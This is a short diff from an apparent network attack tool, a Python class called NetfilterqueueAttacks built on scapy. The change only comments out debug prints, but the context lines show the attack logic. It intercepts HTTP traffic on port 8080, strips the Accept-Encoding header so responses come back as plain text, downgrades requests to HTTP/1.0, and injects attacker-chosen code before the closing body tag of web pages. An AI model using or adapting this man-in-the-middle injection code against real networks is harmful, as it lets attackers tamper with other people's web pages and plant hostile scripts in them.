@@ -99,8 +99,8 @@ class NetfilterqueueAttacks:
                             load = scapy_packet[scapy.Raw].load.decode()
                             # searching http requests
                             if scapy_packet[scapy.TCP].dport == 8080:
-                                print("[+] HTTP Request detected")
-                                print(scapy_packet.show()) 
+                                # print("[+] HTTP Request detected")
+                                # print(scapy_packet.show()) 
                                 # Delete Accept-Encoding header in the load, so the http responses will be in plain text
                                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                                 # Use HTTP/1.0
@@ -108,8 +108,8 @@ class NetfilterqueueAttacks:
 
                             # searching http responses
                             elif scapy_packet[scapy.TCP].sport == 8080:
-                                print("[+] HTTP Response detected")
-                                print(scapy_packet.show())
+                                # print("[+] HTTP Response detected")
+                                # print(scapy_packet.show())
                                 # Put the injection code at the </body> tag
                                 load = load.replace("</body>", self.injection_code + "</body>")
                                 # Changing the Content-Length header
